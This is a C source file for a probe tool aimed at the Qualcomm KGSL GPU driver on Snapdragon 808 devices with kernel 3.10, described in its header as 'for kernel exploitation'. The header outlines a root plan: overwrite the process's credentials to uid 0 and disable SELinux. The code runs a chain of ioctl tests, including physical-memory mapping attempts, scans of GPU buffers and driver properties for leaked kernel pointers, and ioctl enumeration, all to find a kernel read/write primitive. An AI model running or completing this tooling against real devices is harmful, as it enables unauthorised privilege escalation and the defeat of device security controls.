/*
 * kgsl_probe.c — Qualcomm KGSL GPU driver probe for kernel exploitation
 *
 * Tests what KGSL capabilities are available from shell context.
 * The Adreno 418 GPU (Snapdragon 808/MSM8992) KGSL driver on kernel 3.10
 * may allow physical memory access via GPU memory mapping.
 *
 * If we can map/read arbitrary physical memory through KGSL, we can:
 * 1. Find our task_struct by scanning for our PID
 * 2. Read the cred pointer from task_struct
 * 3. Overwrite uid/gid in cred struct to 0
 * 4. Disable SELinux by writing to selinux_enforcing
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o kgsl_probe kgsl_probe.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

/* ========================================================================
 * KGSL ioctl definitions (from msm_kgsl.h, kernel 3.10)
 * ======================================================================== */

#define KGSL_IOC_TYPE 0x09

/* KGSL memory types for MAP_USER_MEM */
#define KGSL_USER_MEM_TYPE_PMEM     0x00000000
#define KGSL_USER_MEM_TYPE_ADDR     0x00000001
#define KGSL_USER_MEM_TYPE_ASHMEM   0x00000002
#define KGSL_USER_MEM_TYPE_ION      0x00000003

/* KGSL memory flags */
#define KGSL_MEMFLAGS_GPUREADONLY   0x01000000
#define KGSL_CACHEMODE_WRITEBACK    0x0C000000

/* KGSL properties */
#define KGSL_PROP_DEVICE_INFO       0x1
#define KGSL_PROP_DEVICE_SHADOW     0x2
#define KGSL_PROP_DEVICE_POWER      0x3
#define KGSL_PROP_SHMEM             0x4
#define KGSL_PROP_SHMEM_APERTURES   0x5
#define KGSL_PROP_MMU_ENABLE        0x6
#define KGSL_PROP_INTERRUPT_WAITS   0x7
#define KGSL_PROP_VERSION           0x8
#define KGSL_PROP_GPU_RESET_STAT    0x9
#define KGSL_PROP_PWRCTRL           0xE
#define KGSL_PROP_PWR_CONSTRAINT    0x12
#define KGSL_PROP_UCHE_GMEM_VADDR  0x13
#define KGSL_PROP_SP_GENERIC_MEM   0x14
#define KGSL_PROP_GPMU_VERSION     0x15

/* Context create flags */
#define KGSL_CONTEXT_NO_GMEM_ALLOC  0x00000001
#define KGSL_CONTEXT_PREAMBLE       0x00000002
#define KGSL_CONTEXT_TRASH_STATE    0x00000004
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000008

/* ioctl structs */
struct kgsl_device_getproperty {
    unsigned int type;
    void *value;
    unsigned int sizebytes;
};

struct kgsl_devinfo {
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned int gmem_gpubaseaddr;
    unsigned int gpu_id;
    unsigned int gmem_sizebytes;
};

struct kgsl_version {
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    unsigned long size;
    unsigned int flags;
};

struct kgsl_gpumem_alloc_id {
    unsigned int id;
    unsigned int flags;
    unsigned long size;
    unsigned long mmapsize;
    unsigned long gpuaddr;
};

struct kgsl_gpumem_free_id {
    unsigned int id;
};

struct kgsl_gpumem_get_info {
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int flags;
    unsigned long size;
    unsigned long mmapsize;
    unsigned long useraddr;
};

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    unsigned long len;
    unsigned long offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

struct kgsl_sharedmem_free {
    unsigned long gpuaddr;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};

struct kgsl_device_waittimestamp_ctxtid {
    unsigned int context_id;
    unsigned int timestamp;
    unsigned int timeout;
};

/* ioctl numbers */
#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

#define IOCTL_KGSL_MAP_USER_MEM \
    _IOW(KGSL_IOC_TYPE, 0x0A, struct kgsl_map_user_mem)

#define IOCTL_KGSL_SHAREDMEM_FREE \
    _IOW(KGSL_IOC_TYPE, 0x15, struct kgsl_sharedmem_free)

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc)

#define IOCTL_KGSL_GPUMEM_ALLOC_ID \
    _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)

#define IOCTL_KGSL_GPUMEM_FREE_ID \
    _IOW(KGSL_IOC_TYPE, 0x35, struct kgsl_gpumem_free_id)

#define IOCTL_KGSL_GPUMEM_GET_INFO \
    _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)

/* ======================================================================== */

static int kgsl_fd = -1;

static int kgsl_getproperty(unsigned int type, void *value, unsigned int size) {
    struct kgsl_device_getproperty prop = {
        .type = type,
        .value = value,
        .sizebytes = size,
    };
    return ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop);
}

static void test_device_info(void) {
    printf("\n=== Test 1: Device Information ===\n");

    struct kgsl_devinfo info;
    memset(&info, 0, sizeof(info));
    int ret = kgsl_getproperty(KGSL_PROP_DEVICE_INFO, &info, sizeof(info));
    if (ret < 0) {
        printf("  DEVICE_INFO: %s\n", strerror(errno));
    } else {
        printf("  device_id:        0x%x\n", info.device_id);
        printf("  chip_id:          0x%08x\n", info.chip_id);
        printf("  mmu_enabled:      %d\n", info.mmu_enabled);
        printf("  gmem_gpubaseaddr: 0x%x\n", info.gmem_gpubaseaddr);
        printf("  gpu_id:           0x%x\n", info.gpu_id);
        printf("  gmem_sizebytes:   0x%x (%d KB)\n", info.gmem_sizebytes,
               info.gmem_sizebytes / 1024);
    }

    struct kgsl_version ver;
    memset(&ver, 0, sizeof(ver));
    ret = kgsl_getproperty(KGSL_PROP_VERSION, &ver, sizeof(ver));
    if (ret < 0) {
        printf("  VERSION: %s\n", strerror(errno));
    } else {
        printf("  Driver version:   %d.%d\n", ver.drv_major, ver.drv_minor);
        printf("  Device version:   %d.%d\n", ver.dev_major, ver.dev_minor);
    }
}

static void test_mmu_info(void) {
    printf("\n=== Test 2: MMU/IOMMU Status ===\n");

    struct kgsl_devinfo info;
    memset(&info, 0, sizeof(info));
    int ret = kgsl_getproperty(KGSL_PROP_DEVICE_INFO, &info, sizeof(info));
    if (ret == 0) {
        printf("  MMU enabled: %s\n", info.mmu_enabled ? "YES (IOMMU active)" : "NO (direct physical!)");
        if (!info.mmu_enabled) {
            printf("  >>> GPU has DIRECT physical memory access! <<<\n");
            printf("  >>> This means GPU commands can read/write ANY physical address! <<<\n");
        }
    }
}

static void test_gpu_alloc(void) {
    printf("\n=== Test 3: GPU Memory Allocation ===\n");

    /* Try GPUMEM_ALLOC_ID (newer interface) */
    struct kgsl_gpumem_alloc_id alloc_id = {0};
    alloc_id.size = 4096;
    alloc_id.flags = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc_id);
    if (ret == 0) {
        printf("  GPUMEM_ALLOC_ID: SUCCESS\n");
        printf("    id:       %u\n", alloc_id.id);
        printf("    gpuaddr:  0x%lx\n", alloc_id.gpuaddr);
        printf("    size:     %lu\n", alloc_id.size);
        printf("    mmapsize: %lu\n", alloc_id.mmapsize);

        /* Try to mmap this allocation */
        void *ptr = mmap(NULL, alloc_id.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, kgsl_fd, alloc_id.id * 4096);
        if (ptr != MAP_FAILED) {
            printf("    mmap:     SUCCESS at %p\n", ptr);

            /* Write a test pattern */
            memset(ptr, 0x41, 64);
            printf("    write:    OK (wrote 64 bytes)\n");

            /* Read it back */
            uint64_t *vals = (uint64_t *)ptr;
            printf("    readback: 0x%016lx 0x%016lx\n", vals[0], vals[1]);

            munmap(ptr, alloc_id.mmapsize);
        } else {
            printf("    mmap:     FAILED: %s\n", strerror(errno));

            /* Try with offset = gpuaddr */
            ptr = mmap(NULL, alloc_id.size, PROT_READ | PROT_WRITE,
                      MAP_SHARED, kgsl_fd, alloc_id.gpuaddr);
            if (ptr != MAP_FAILED) {
                printf("    mmap(gpuaddr): SUCCESS at %p\n", ptr);
                munmap(ptr, alloc_id.size);
            } else {
                printf("    mmap(gpuaddr): FAILED: %s\n", strerror(errno));
            }
        }

        /* Free it */
        struct kgsl_gpumem_free_id free_id = { .id = alloc_id.id };
        ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_id);
    } else {
        printf("  GPUMEM_ALLOC_ID: %s\n", strerror(errno));
    }

    /* Try legacy GPUMEM_ALLOC */
    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 4096;
    alloc.flags = 0;

    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc);
    if (ret == 0) {
        printf("  GPUMEM_ALLOC: SUCCESS\n");
        printf("    gpuaddr: 0x%lx\n", alloc.gpuaddr);
        printf("    size:    %lu\n", alloc.size);

        /* Try to mmap */
        void *ptr = mmap(NULL, alloc.size, PROT_READ | PROT_WRITE,
                        MAP_SHARED, kgsl_fd, alloc.gpuaddr);
        if (ptr != MAP_FAILED) {
            printf("    mmap:    SUCCESS at %p\n", ptr);
            munmap(ptr, alloc.size);
        } else {
            printf("    mmap:    FAILED: %s\n", strerror(errno));
        }

        /* Free */
        struct kgsl_sharedmem_free sfree = { .gpuaddr = alloc.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &sfree);
    } else {
        printf("  GPUMEM_ALLOC: %s\n", strerror(errno));
    }
}

static void test_map_user_mem(void) {
    printf("\n=== Test 4: MAP_USER_MEM (Physical Memory Mapping) ===\n");

    /* Try to map our own stack memory to GPU */
    char buf[4096] __attribute__((aligned(4096)));
    memset(buf, 0x42, sizeof(buf));

    struct kgsl_map_user_mem map = {0};
    map.fd = -1;
    map.gpuaddr = 0;  /* Let KGSL assign */
    map.len = sizeof(buf);
    map.offset = 0;
    map.hostptr = (unsigned long)buf;
    map.memtype = KGSL_USER_MEM_TYPE_ADDR;
    map.flags = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &map);
    if (ret == 0) {
        printf("  MAP_USER_MEM (ADDR): SUCCESS\n");
        printf("    gpuaddr: 0x%lx\n", map.gpuaddr);
        printf("    >>> User memory mapped to GPU address space! <<<\n");

        /* Free */
        struct kgsl_sharedmem_free sfree = { .gpuaddr = map.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &sfree);
    } else {
        printf("  MAP_USER_MEM (ADDR): %s\n", strerror(errno));
    }

    /* Try PMEM type (might give physical memory access) */
    struct kgsl_map_user_mem map2 = {0};
    map2.fd = -1;
    map2.gpuaddr = 0;
    map2.len = 4096;
    map2.offset = 0;
    map2.hostptr = 0;  /* Physical address 0 */
    map2.memtype = KGSL_USER_MEM_TYPE_PMEM;
    map2.flags = 0;

    ret = ioctl(kgsl_fd, IOCTL_KGSL_MAP_USER_MEM, &map2);
    if (ret == 0) {
        printf("  MAP_USER_MEM (PMEM): SUCCESS\n");
        printf("    gpuaddr: 0x%lx\n", map2.gpuaddr);
        printf("    >>> PMEM mapping works! Physical memory access possible! <<<\n");

        struct kgsl_sharedmem_free sfree = { .gpuaddr = map2.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &sfree);
    } else {
        printf("  MAP_USER_MEM (PMEM): %s (expected)\n", strerror(errno));
    }
}

static void test_drawctxt(void) {
    printf("\n=== Test 5: GPU Context Creation ===\n");

    struct kgsl_drawctxt_create create = {0};
    create.flags = KGSL_CONTEXT_NO_GMEM_ALLOC;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create);
    if (ret == 0) {
        printf("  DRAWCTXT_CREATE: SUCCESS\n");
        printf("    context_id: %u\n", create.drawctxt_id);
        printf("    >>> Can create GPU contexts for command submission! <<<\n");

        /* Destroy it */
        struct kgsl_drawctxt_destroy destroy = {
            .drawctxt_id = create.drawctxt_id
        };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    } else {
        printf("  DRAWCTXT_CREATE: %s\n", strerror(errno));
    }
}

static void test_alloc_and_scan(void) {
    printf("\n=== Test 6: Large GPU Alloc + Kernel Data Scan ===\n");

    /* Allocate a larger GPU buffer and check for any kernel data leaks */
    struct kgsl_gpumem_alloc_id alloc = {0};
    alloc.size = 1024 * 1024;  /* 1MB */
    alloc.flags = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc);
    if (ret < 0) {
        printf("  Large alloc failed: %s\n", strerror(errno));
        return;
    }

    printf("  Allocated 1MB GPU buffer, id=%u, gpuaddr=0x%lx\n",
           alloc.id, alloc.gpuaddr);

    /* Try to mmap */
    void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                    MAP_SHARED, kgsl_fd, alloc.id * 4096);
    if (ptr == MAP_FAILED) {
        ptr = mmap(NULL, alloc.size, PROT_READ | PROT_WRITE,
                  MAP_SHARED, kgsl_fd, alloc.gpuaddr);
    }

    if (ptr != MAP_FAILED) {
        printf("  mmap: SUCCESS at %p\n", ptr);

        /* Scan for kernel-like pointers (0xFFFFFFC0xxxxxxxx) */
        uint64_t *vals = (uint64_t *)ptr;
        int kernel_ptrs = 0;
        int nonzero = 0;

        for (size_t i = 0; i < alloc.size / 8; i++) {
            if (vals[i] != 0) {
                nonzero++;
                if ((vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    kernel_ptrs++;
                    if (kernel_ptrs <= 10) {
                        printf("    [+] Kernel ptr at offset 0x%zx: 0x%016lx\n",
                               i * 8, vals[i]);
                    }
                }
            }
        }

        printf("  Scan results: %d non-zero qwords, %d kernel-like pointers\n",
               nonzero, kernel_ptrs);

        if (kernel_ptrs > 0) {
            printf("  >>> KERNEL DATA LEAKED through GPU memory! <<<\n");
        } else if (nonzero > 0) {
            printf("  Buffer contains stale data (not zeroed)\n");
            /* Show first few non-zero values */
            int shown = 0;
            for (size_t i = 0; i < alloc.size / 8 && shown < 5; i++) {
                if (vals[i] != 0) {
                    printf("    offset 0x%zx: 0x%016lx\n", i * 8, vals[i]);
                    shown++;
                }
            }
        } else {
            printf("  Buffer is zeroed (no data leak)\n");
        }

        munmap(ptr, alloc.mmapsize ? alloc.mmapsize : alloc.size);
    } else {
        printf("  mmap: FAILED: %s\n", strerror(errno));
    }

    struct kgsl_gpumem_free_id free_id = { .id = alloc.id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free_id);
}

static void test_ioctl_enumeration(void) {
    printf("\n=== Test 7: IOCTL Enumeration ===\n");

    /* Try a range of KGSL ioctls to see which ones are available */
    struct {
        unsigned int nr;
        const char *name;
    } ioctls[] = {
        { 0x01, "DEVICE_WAITTIMESTAMP" },
        { 0x02, "DEVICE_GETPROPERTY" },
        { 0x03, "DEVICE_SETPROPERTY" },
        { 0x09, "DEVICE_WAITTIMESTAMP_CTXTID" },
        { 0x0A, "MAP_USER_MEM" },
        { 0x10, "CMDSTREAM_READTIMESTAMP_OLD" },
        { 0x11, "CMDSTREAM_READTIMESTAMP" },
        { 0x12, "CMDSTREAM_FREEMEMONTIMESTAMP" },
        { 0x13, "DRAWCTXT_CREATE" },
        { 0x14, "DRAWCTXT_DESTROY" },
        { 0x15, "SHAREDMEM_FREE" },
        { 0x2F, "GPUMEM_ALLOC" },
        { 0x30, "CFF_SYNCMEM" },
        { 0x31, "CFF_USER_EVENT" },
        { 0x33, "TIMESTAMP_EVENT" },
        { 0x34, "GPUMEM_ALLOC_ID" },
        { 0x35, "GPUMEM_FREE_ID" },
        { 0x36, "GPUMEM_GET_INFO" },
        { 0x37, "SETPROPERTY" },
        { 0x38, "GPUMEM_SYNC_CACHE" },
        { 0x39, "GPU_COMMAND" },
        { 0x3A, "GPUMEM_SYNC_CACHE_BULK" },
        { 0x3B, "SYNCSOURCE_CREATE" },
        { 0x3C, "SYNCSOURCE_DESTROY" },
        { 0x3D, "SYNCSOURCE_CREATE_FENCE" },
        { 0x3E, "SYNCSOURCE_SIGNAL_FENCE" },
    };

    for (int i = 0; i < (int)(sizeof(ioctls) / sizeof(ioctls[0])); i++) {
        /* Use a dummy buffer to test if the ioctl number is accepted */
        char dummy[256] = {0};
        unsigned long cmd = _IOWR(KGSL_IOC_TYPE, ioctls[i].nr, dummy);
        errno = 0;
        int ret = ioctl(kgsl_fd, cmd, dummy);
        /* EINVAL or EFAULT means the ioctl exists but args are wrong
         * ENOTTY means the ioctl doesn't exist */
        if (errno == ENOTTY) {
            printf("  0x%02x %-35s NOT AVAILABLE\n", ioctls[i].nr, ioctls[i].name);
        } else {
            printf("  0x%02x %-35s AVAILABLE (ret=%d, errno=%s)\n",
                   ioctls[i].nr, ioctls[i].name, ret, strerror(errno));
        }
    }
}

static void test_getproperty_leak(void) {
    printf("\n=== Test 8: GETPROPERTY Data Leak Scan ===\n");

    /* Try all property types and look for kernel addresses in responses */
    unsigned int props[] = {
        KGSL_PROP_DEVICE_INFO, KGSL_PROP_DEVICE_SHADOW, KGSL_PROP_DEVICE_POWER,
        KGSL_PROP_SHMEM, KGSL_PROP_SHMEM_APERTURES, KGSL_PROP_MMU_ENABLE,
        KGSL_PROP_INTERRUPT_WAITS, KGSL_PROP_VERSION, KGSL_PROP_GPU_RESET_STAT,
        KGSL_PROP_PWRCTRL, KGSL_PROP_PWR_CONSTRAINT,
        KGSL_PROP_UCHE_GMEM_VADDR, KGSL_PROP_SP_GENERIC_MEM,
        0x10, 0x11, 0x16, 0x17, 0x18, 0x19, 0x1A,
    };

    for (int i = 0; i < (int)(sizeof(props) / sizeof(props[0])); i++) {
        char buf[256];
        memset(buf, 0, sizeof(buf));

        int ret = kgsl_getproperty(props[i], buf, sizeof(buf));
        if (ret == 0) {
            /* Check for kernel-like values */
            uint64_t *vals = (uint64_t *)buf;
            printf("  Prop 0x%02x: ", props[i]);
            int has_kptr = 0;
            for (int j = 0; j < 32; j++) {
                if ((vals[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("KERNEL PTR at +%d: 0x%016lx ", j * 8, vals[j]);
                    has_kptr = 1;
                }
            }
            if (!has_kptr) {
                /* Show first 4 values */
                printf("0x%lx 0x%lx 0x%lx 0x%lx",
                       vals[0], vals[1], vals[2], vals[3]);
            }
            printf("\n");
        }
    }
}

int main(void) {
    printf("=== KGSL GPU Driver Probe ===\n");
    printf("Target: Adreno 418 (Snapdragon 808/MSM8992)\n");
    printf("Kernel: ");
    fflush(stdout);
    system("uname -r");
    printf("PID: %d\n", getpid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    printf("Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    test_device_info();
    test_mmu_info();
    test_gpu_alloc();
    test_map_user_mem();
    test_drawctxt();
    test_alloc_and_scan();
    test_getproperty_leak();
    test_ioctl_enumeration();

    printf("\n=== Summary ===\n");
    printf("If any kernel pointers were found, we can use KGSL for kernel R/W.\n");
    printf("If GPU contexts can be created, we can submit GPU commands.\n");
    printf("If MAP_USER_MEM works, we can map arbitrary memory to GPU.\n");

    close(kgsl_fd);
    return 0;
}
